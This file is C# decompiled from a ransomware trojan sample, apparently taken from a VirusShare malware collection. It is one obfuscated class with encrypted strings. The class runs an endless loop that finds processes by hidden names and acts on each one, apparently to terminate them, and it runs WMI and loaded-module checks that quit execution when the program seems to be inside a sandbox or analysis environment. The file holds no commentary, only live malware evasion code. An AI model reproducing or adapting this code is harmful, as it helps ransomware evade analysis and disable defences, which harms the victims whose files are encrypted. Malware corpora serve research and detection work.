// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Output, Version=1.1.0.0, Culture=neutral, PublicKeyToken=ed61553e989492b3
// MVID: C7CC9454-F663-4E88-B488-D89A8E8A2020
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Foreign.dee-7b2f429bcd0936ae802edc4bf60d2431ff2f87ffc6d1c3c3879ec6651f92b519.exe

using \u0002;
using \u0003;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;

namespace \u0002
{
  internal class \u0004
  {
    [NonSerialized]
    internal static \u0007 \u0082;

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long \u0001([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0);

    public static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      while (true)
      {
        Process[] processArray1 = \u0011.\u0099(\u0004.\u0082(239));
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < processArray1.Length)
        {
          Process process = processArray1[*(int*) voidPtr];
          \u0012.\u007E\u009A((object) process);
          if (true)
            *(int*) voidPtr = checked (*(int*) voidPtr + 1);
        }
        Process[] processArray2 = \u0011.\u0099(\u0004.\u0082(252));
label_5:
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (true)
        {
          if (true)
          {
            if (*(int*) ((IntPtr) voidPtr + 4) < processArray2.Length)
            {
              Process process = processArray2[*(int*) ((IntPtr) voidPtr + 4)];
              \u0012.\u007E\u009A((object) process);
              *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
            }
            else
              break;
          }
          else
            goto label_5;
        }
        \u0013.\u0011\u0002(2000);
      }
    }

    public static void \u0002()
    {
      int num1 = \u0014.\u0013\u0002(\u0004.\u0001(), \u0004.\u0082(265), false);
      if (true)
      {
        if (num1 == 0)
        {
          \u0013.\u0012\u0002(0);
          return;
        }
        int num2 = \u0015.\u007E\u0014\u0002((object) \u0004.\u0001(), \u0004.\u0082(298)) ? 1 : 0;
        do
        {
          if (true)
          {
            if (num2 != 0)
            {
              \u0013.\u0012\u0002(0);
              return;
            }
            num2 = \u0014.\u0013\u0002(\u0004.\u0001(), \u0004.\u0082(307), false);
          }
          if (true)
          {
            int num3 = 0;
            if (num3 == 0)
            {
              if (num2 == num3)
              {
                \u0013.\u0012\u0002(0);
                if (false)
                  goto label_3;
                else
                  goto label_22;
              }
              else
              {
                int num4 = \u0014.\u0013\u0002(\u0004.\u0001(), \u0004.\u0082(344), false);
                num3 = 0;
                num2 = num4;
              }
            }
            num2 = num2 == num3 ? 1 : 0;
          }
        }
        while (false);
        goto label_17;
label_3:
        return;
label_22:
        return;
label_17:
        int num5 = \u0014.\u0013\u0002(\u0004.\u0001(), \u0004.\u0082(381), false) == 0 ? 1 : 0;
        if ((num2 | num5) != 0)
        {
          \u0013.\u0012\u0002(0);
          return;
        }
        num1 = \u0004.\u0001() ? 1 : 0;
      }
      if (num1 == 0)
        return;
      \u0013.\u0012\u0002(0);
    }

    private static string \u0001()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u0004.\u0082(398), \u0004.\u0082(415));
      string str;
      if (true)
      {
        str = string.Empty;
        ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
        try
        {
          if (true)
            objectEnumerator = \u0017.\u007E\u0016\u0002((object) \u0016.\u007E\u0015\u0002((object) managementObjectSearcher));
          while (\u0004.\u007E\u0005((object) objectEnumerator))
          {
            if (true)
            {
              ManagementObject managementObject = (ManagementObject) \u0018.\u007E\u0017\u0002((object) objectEnumerator);
              str = \u001A.\u0019\u0002(\u0008.\u0089(\u0019.\u007E\u0018\u0002((object) managementObject, \u0004.\u0082(464))));
            }
            else
              break;
          }
        }
        finally
        {
          if (objectEnumerator != null)
            \u0012.\u007E\u009B((object) objectEnumerator);
        }
      }
      return str;
    }

    private static bool \u0001()
    {
      bool flag;
      try
      {
        while (true)
        {
          string str = \u0004.\u0082(481);
          if (true)
          {
            int num;
            for (int index = \u0004.\u0001(ref str) != 0L ? 1 : 0; index == 0; index = num)
            {
              if (true)
              {
                num = 0;
                if (num == 0)
                {
                  flag = num != 0;
                  goto label_7;
                }
              }
              else
                goto label_11;
            }
            goto label_4;
          }
        }
        goto label_7;
label_4:
        if (true)
        {
          flag = true;
          goto label_11;
        }
        else
          goto label_11;
label_7:
        if (false)
          goto label_4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u001C.\u001C\u0002();
      }
label_11:
      return flag;
    }

    static \u0004() => \u0008.\u0001(typeof (\u0004));
  }
}
